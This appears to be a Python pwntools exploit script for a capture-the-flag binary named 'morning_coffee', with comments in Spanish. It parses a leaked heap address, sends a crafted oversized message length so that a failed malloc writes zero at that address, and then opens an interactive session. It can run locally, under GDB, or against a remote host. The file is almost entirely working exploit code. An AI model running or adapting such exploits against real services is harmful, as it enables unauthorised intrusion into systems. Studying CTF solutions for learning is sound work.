#!/usr/bin/python3
from pwn import *
import sys
import warnings
warnings.filterwarnings("ignore")

### GDB SCRIPT
gs = '''
b * main+166
b * main+225
continue
'''

### LOADING AN ELF
elf = context.binary = ELF('./morning_coffee', checksec=False)
#libc = elf.libc

### TMUX CONFIGURE
context.terminal = ['tmux', 'splitw', '-hp', '80']
context.bits = 64

### DEBUGGING TYPE
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gs, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)


# We can't send null bytes as argv, so strip them strip(b'\x00')
r = start()

### +++++ EXPLOIT CODE +++++
r.recvuntil(b"morning")
r.recvline()
leak_chunk = int(r.recvline().strip(), 16)
log.info(f"HEAP: {hex(leak_chunk)}")

# como el size es grande malloc nos da error de 0 por ende 0+address=0 
# donde escribe 0 en la direccion del heap lekeada
size = leak_chunk+0x10
payload = b's1kr10s'

r.sendlineafter(b'message? ', f"{size}")
r.sendlineafter(b'message: ', f"{payload}")

### +++++ INTERACTIVE +++++
r.interactive()
